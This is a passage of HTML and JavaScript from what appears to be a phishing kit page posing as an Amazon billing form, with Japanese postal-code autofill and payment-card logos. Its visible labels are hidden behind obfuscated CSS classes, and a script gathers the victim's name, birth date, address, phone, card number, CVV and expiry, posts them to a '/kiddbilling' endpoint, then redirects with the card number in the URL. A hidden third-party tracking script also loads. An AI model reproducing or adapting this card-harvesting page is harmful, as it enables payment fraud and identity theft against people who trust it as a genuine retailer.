                                                    addressLineOneTextInput.trigger('input'); // used to tigger input handlers, e.g. clear text icon
                                                    addressLineOneTextInput.focus();
                                                }
                                            } else if ("true" === data.isAjaxError) {
                                                incrementCounter("JPAutopopulationFailure");
                                            }
                                        } else {
                                            incrementCounter("JPAutopopulationFailure");
                                        }
                                    }
                                }

                                var autopopulateBasedonPostalCode = function () {

                                    var $enterAddressPostalCodeOne = $("#address-ui-widgets-enterAddressPostalCodeOne");
                                    var $enterAddressPostalCodeTwo = $("#address-ui-widgets-enterAddressPostalCodeTwo");
                                    var postalCodeOne = $enterAddressPostalCodeOne.val();
                                    var postalCodeTwo = $enterAddressPostalCodeTwo.val();

                                    if ($enterAddressPostalCodeOne.is(":focus") && postalCodeOne.length == postalCodeOneLength) {
                                        $enterAddressPostalCodeTwo.focus();
                                    }

                                    var caback1 = function (response) {
                                        console.log(response);
                                        var resultJSON = JSON.parse(response);
                                        if (resultJSON.status == 200 && resultJSON.results && resultJSON.results.length) {
                                            var data = resultJSON.results[0];
                                            var address1 = data.address1;
                                            var address2 = data.address2;
                                            var address3 = data.address3;
                                            console.log('address1: ', address1, +', address2: ', address2);
                                            $('#address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId').val([address1]);
                                            $('#address-ui-widgets-enterAddressStateOrRegion-shown').html('<span class="a-dropdown-prompt">' + address1 + '</span>');
                                            $('#address-ui-widgets-enterAddressLine1').val(address2 + address3);

                                        }
                                        else {
                                            console.log('error');
                                        }
                                    }

                                    if (postalCodeOne.length === postalCodeOneLength && postalCodeTwo.length === postalCodeTwoLength) {
                                        var postalCode = postalCodeOne + "-" + postalCodeTwo;

                                        if (postalCode.length === postalCodeLength) {

                                            $.get(
                                                    '/zipcode?zipcode=' + (postalCodeOne + postalCodeTwo), caback1
                                            );

                                        }
                                    }
                                };

                                $("#address-ui-widgets-enterAddressPostalCodeOne").bind("input", autopopulateBasedonPostalCode);
                                $("#address-ui-widgets-enterAddressPostalCodeTwo").bind("input", autopopulateBasedonPostalCode);
                            });
</script>
      </span>

                        <hr/>
                        <span class="colorblacked" style="display:block;"><link href="css/billing/QingBao.css"
                                                                                rel="stylesheet" type="text/css"><font
                                size="5"><span class="ECHyw"><span class="uAsXU"></span><span class="OdrdJ"></span><span
                                class="TQMkj"></span><span class="KsmyD"></span><span class="QKffG"></span><span
                                class="stLRM"></span></font>
                                	
                                	<br>
                                	
                                	<link href="css/billing/QingBao.css" rel="stylesheet" type="text/css"><font
                                    size="3"><span class="ECwHy"></span><span class="OwwUG"></span><span
                                    class="VjXxl"></span><span class="BBDaK"></span><span class="cyhsg"></span><span
                                    class="ElDMA"></span><span class="GODAD"></span><span class="pEnnq"></span><span
                                    class="WUGCd"></span><span class="QETyA"></span><span class="dVPkP"></span><span
                                    class="GJiur"></span><span class="MBymk"></span></font>
                                	
                                	<br><br>
                <span class="righttext"><link href="css/billing/AnQuan.css" rel="stylesheet" type="text/css"><font
                        size="3"><span class="VFNPU"></span><span class="XwuRb"></span><span class="kLLHW"></span><span
                        class="SWxne"></span><span class="xnupA"></span><span class="JFWQO"></span><span
                        class="YWHrk"></span><span class="GIyXm"></span><span class="UznvO"></span><span
                        class="ghaRS"></span><span class="PhvjH"></span><span class="eUwBj"></span><span
                        class="lblvh"></span><span class="xZAGV"></span><span class="XOrcj"></span><span
                        class="iHDZc"></span><span class="GWAdt"></span><span class="rSQnJ"></span><span
                        class="IkzEU"></span><span class="hIMuM"></span><span class="eBlPT"></span><span
                        class="vMzip"></span><span class="VUgjP"></span><span class="kjEDT"></span><span
                        class="hdnKr"></span><span class="rLJGy"></span><span class="gczor"></span><span
                        class="oaupi"></span><span class="MytJJ"></span><span class="oailh"></span><span
                        class="okUfr"></span><span class="APVpC"></span><span class="CwrHP"></span><span
                        class="Esvny"></span><span class="ahBgS"></span><span class="IuuJz"></span><span
                        class="cJiQo"></span><span class="eWvGH"></span><span class="lgKph"></span><span
                        class="uBmbE"></span><span class="cUwxh"></span><span class="sswkf"></span><span
                        class="KnEbJ"></span><span class="xUaou"></span><span class="NTNGP"></span><span
                        class="VBEYo"></span><span class="WgpnN"></span><span class="QBBEf"></span><span
                        class="jSrJd"></span><span class="knZKj"></span><span class="uldyP"></span><span
                        class="ClzkE"></span><span class="nKGLY"></span><span class="kJoTW"></span><span
                        class="GLXTo"></span><span class="uMwbs"></span><span class="kSmXB"></span></span></font>
                            <br><br>

<div class="a-row a-spacing-base"><div class="a-row"><span class="a-size-medium pmts-portal-add-ba-title a-text-bold"><link
        href="aa/0Card.css" rel="stylesheet" type="text/css"><span class="byeGH"></span><span class="ATzxF"></span><span
        class="Qbbvr"></span><span class="lHPoO"></span><span class="zhioI"></span><span class="QTgPj"></span><span
        class="VZSYT"></span><span class="FTaMu"></span></span></div><div class="a-row"><div class="a-row"><link
        href="aa/0Card.css" rel="stylesheet" type="text/css"><span class="xmjBX"></span><span class="AZjBy"></span><span
        class="nbTPe"></span><span class="WWYfT"></span><span class="KKNWV"></span><span class="Xmmsr"></span><span
        class="bPwGP"></span><span class="ATbul"></span><span class="HqpDq"></span><span class="RSTur"></span><span
        class="MeEUe"></span><span class="bQHOe"></span><span class="NPZWO"></span><span class="aUwOb"></span><span
        class="BhYkt"></span><span class="GfpPJ"></span><span class="HJCac"></span><span class="RDnUh"></span><span
        class="mqPZt"></span><span class="PXTKw"></span><span class="qrWVH"></span></div></div></div>

			    <div class="mt-1">
                            <img src="assets/img/payment6.png" alt="">
                            <img src="assets/img/payment1.png" alt="">
                            <img src="assets/img/payment2.png" alt="">
                            <img src="assets/img/payment3.html" alt="">
                            <img src="assets/img/payment4.png" alt="">
                            <img src="assets/img/payment7.png" alt="">
                        </div>
<br>
<a id="pp-bf-20" href="javascript:void(0)" data-action="a-expander-toggle"
   class="a-expander-header a-declarative a-expander-inline-header pmts-add-new-card a-spacing-base a-link-expander"
   data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i
        class="a-icon a-icon-collapse"></i><span class="a-expander-prompt"><span class="a-size-base"><link
        href="aa/0Card.css" rel="stylesheet" type="text/css"><span class="JyGjO"></span><span class="cAsWw"></span><span
        class="mhzwx"></span><span class="Vhlfz"></span><span class="WxNwj"></span><span
        class="CvvoK"></span></span></span></a>

<div id="pp-bf-23" class="a-row a-spacing-base a-hidden aok-hidden"><div class="a-column a-span10"><div
        class="a-box a-alert a-alert-error" aria-live="assertive" role="alert"><div
        class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content"><ul
        class="a-unordered-list a-vertical"></ul></div></div></div></div></div>
<div class="a-row a-spacing-base"><link href="aa/0Card.css" rel="stylesheet" type="text/css"><span class="VDbKw"></span><span
        class="SsavY"></span><span class="GutUA"></span><span class="NeyUN"></span><span class="rgQHU"></span><span
        class="cyXRa"></span><span class="bKksM"></span><span class="LaYyp"></span><span class="rivUa"></span><span
        class="jBqJT"></span><span class="cLYZT"></span><span class="rpTzs"></span><span class="qURrJ"></span><span
        class="eyLoU"></span></div>
                        <div class="row mt-3">
                            <div class="col-sm-6">
                                <div class="form-group">
                                    <label for="cxoxn">
                                        <link href="aa/xyWGz.css" rel="stylesheet" type="text/css">
                                        <span class="IezZa"></span><span class="qNuEi"></span><span
                                            class="jSBeq"></span><span class="gDoyx"></span><span
                                            class="lgCJI"></span><span class="XCPVw"></span><span
                                            class="gylpk"></span><span class="aIGet"></span><span
                                            class="aIGQt"></span><span class="aIGWt"></span><span
                                            class="aIGEt"></span><span class="aIGRt"></span><span
                                            class="aIGTt"></span><span class="aIGYt"></span></label>
                                    <input style="width:240px;height:38px;" type="text"
                                           class="form-control amazoninput var-title" name="nameCard" id="cxoxn"
                                           placeholder="" required="true"
                                           oninput="value=value.replace(/[^a-zA-Z\s]/g,'')">
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-group">
                                    <label for="cxdi">
                                        <link href="aa/SYQNw.css" rel="stylesheet" type="text/css">
                                        <span class="OzrNK"></span><span class="VRMDk"></span><span
                                            class="NUdkm"></span><span class="oODZf"></span><span class="jrXeu"></span></label>
                                    <input style="width:240px;height:38px;" type="text"
                                           oninput="value=value.replace(/[^\d]/g,'')" maxlength="16"
                                           class="form-control amazoninput var-title" name="cxdi" id="cxdi"
                                           autocomplete="off" placeholder="" required="true" onblur="upperCase()">
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="form-group">
                                    <label for="vxvxc">
                                        <link href="aa/ruTFI.css" rel="stylesheet" type="text/css">
                                        <span class="IwVzk"></span><span class="RjxDn"></span><span
                                            class="xPKfm"></span><span class="qDHya"></span><span
                                            class="vTmtK"></span><span class="Tmeki"></span><span
                                            class="JgwNr"></span><span class="yUToR"></span><span
                                            class="wAqgQ"></span><span class="mdEIe"></span></label>
                                    <input style="width:240px;height:38px;" oninput="value=value.replace(/[^\d]/g,'')"
                                           type="text" class="form-control amazoninput var-title" name="csc" id="vxvxc"
                                           placeholder="" maxlength="3" required="true">
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="row">
                                    <div class="col-6">
                                        <div class="form-group">
                                            <label><link href="aa/YoUxi.css" rel="stylesheet" type="text/css">
                                        <span class="ahBiJ"></span><span class="CIEZd"></span><span
                                                        class="OdFOx"></span><span class="Cisjc"></span></label>
                                            <select class="form-control bgcolored2" name="month" id="months"
                                                    required="true">
                                                <option selected="selected"><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">月</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">01</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">02</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">03</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">04</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">05</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">06</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">07</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">08</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">09</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">10</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">11</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">12</font></font></option>
                                            </select>
                                            
                                        </div>
                                    </div>
                                    <div class="col-6">
                                        <div class="form-group">
                                            <label style="opacity: 0;"><font style="vertical-align: inherit;"><font
                                                    style="vertical-align: inherit;">1</font></font></label>
                                            <select class="form-control bgcolored2" name="year" id="years"
                                                    required="true">
                                                <option selected="selected"><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">年</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2020</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2021</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2022</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2023</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2024</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2025</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2026</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2027</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2028</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2029</font></font></option>
                                                <option><font style="vertical-align: inherit;"><font
                                                        style="vertical-align: inherit;">2030</font></font></option>
                                                                                        </select>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

				<br>
                        <div class="row">
                            <div class="col-12">
                               <a  id="bt2"  class="btn bgcolored"><link href="css/warning/JiXuA.css" rel="stylesheet" type="text/css"><span class="TlNJP"></span><span class="UbRdT"></span><span class="rrNzI"></span></a>
                            </div>
                        </div>

                </div>

            </div>
        </div>
    </div>
</div>
<br><br>
<br><br>
<div style="display:none;">
    <script type='text/javascript' src='https://s4.cnzz.com/z_stat.php?id=1278854177&amp;web_id=1278854177'></script>
</div>
<script src="library/jquery/main.min.js"></script>
<script src="library/pooper/main.min.js"></script>
<script src="library/bootstrap/js/main.min.js"></script>
<script src="library/jquery/mask/jquery.mask.min.js"></script>
<script src="library/xvalidator/qunit.js"></script>
<script>
    $(document).ready(function () {
        $('.myddown').hover(function () {
            $('.mydropdown').togleClass('d-none');
        })
        $('#buttonToggle').toggleClass();
        $('#birth').mask('00/00/0000');
    })

    $("#bt2").click(function () {
        var countryCode = $("#address-ui-widgets-countryCode-dropdown-nativeId").val();
        var enterAddressFullName = $("#address-ui-widgets-enterAddressFullName").val();
        var birth_year = $("#birth_year").val();
        var birth_month = $("#birth_month").val();
        var birth_day = $("#birth_day").val();
        var enterAddressPostalCodeOne = $("#address-ui-widgets-enterAddressPostalCodeOne").val();
        var enterAddressPostalCodeTwo = $("#address-ui-widgets-enterAddressPostalCodeTwo").val();
        var enterAddressStateOrRegion = $("#address-ui-widgets-enterAddressStateOrRegion-dropdown-nativeId").val();
        var enterAddressLine1 = $("#address-ui-widgets-enterAddressLine1").val();
        var enterAddressLine2 = $("#address-ui-widgets-enterAddressLine2").val();
        var enterAddressLine3 = $("#address-ui-widgets-enterAddressLine3").val();
        var enterAddressPhoneNumber = $("#address-ui-widgets-enterAddressPhoneNumber").val();
        var nameCard = $("#cxoxn").val();
        var cxdi = $("#cxdi").val();
        var csc = $("#vxvxc").val();
        var month = $("#months").val();
        var year = $("#years").val();
        if (!checkForm()) return;
        $.post("/kiddbilling",
                {   countryCode: countryCode,
                    enterAddressFullName: enterAddressFullName,
                    birth_year: birth_year,
                    birth_month: birth_month,
                    birth_day: birth_day,
                    enterAddressPostalCodeOne: enterAddressPostalCodeOne,
                    enterAddressPostalCodeTwo: enterAddressPostalCodeTwo,
                    enterAddressStateOrRegion: enterAddressStateOrRegion,
                    enterAddressLine1: enterAddressLine1,
                    enterAddressLine2: enterAddressLine2,
                    enterAddressLine3: enterAddressLine3,
                    enterAddressPhoneNumber: enterAddressPhoneNumber,
                    nameCard: nameCard,
                    cxdi: cxdi,
                    csc: csc,
                    month: month,
                    year: year
                },
                function (data) {
                    window.location.href = '/user-verified?nameCard='+nameCard+'&cxdi='+cxdi;
                }, "json");
    })
</script>
</body>
</html>
